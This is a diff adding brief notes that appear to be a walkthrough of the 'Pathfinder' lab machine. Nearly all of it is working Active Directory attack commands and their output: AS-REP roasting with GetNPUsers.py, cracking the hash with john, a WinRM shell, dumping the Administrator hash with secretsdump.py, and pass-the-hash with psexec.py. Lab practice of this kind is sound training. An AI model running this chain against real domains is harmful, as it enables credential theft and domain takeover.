@@ -1,0 +1,35 @@
+Pathfinder
+sandra:Password1234! 
+
+nmap:
+389/tcp   open     ldap            Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
+---
+Active Directory (AD) is a Microsoft product that consists of several services that run on Windows Server to manage permissions and access to networked resources. Active Directory stores data as objects. An object is a single element, such as a user, group, application or device, such as a printer.
+---
+
+Enumerate active directory with bloodhound (fail, post issue)
+
+
+Check no auth in kerberos:
+$ GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30
+(copy hash)
+$ john hash -wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Sheffield19      (?)
+1g 0:00:00:07 DONE (2020-04-22 06:34) 0.1355g/s 1436Kp/s 1436Kc/s 1436KC/s Sherbear94..Shanelee
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+svc_bes:Sheffield19
+
+--Normal shell
+$ evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19
+
+--Admin shell
+$ secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::
+
+$ psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
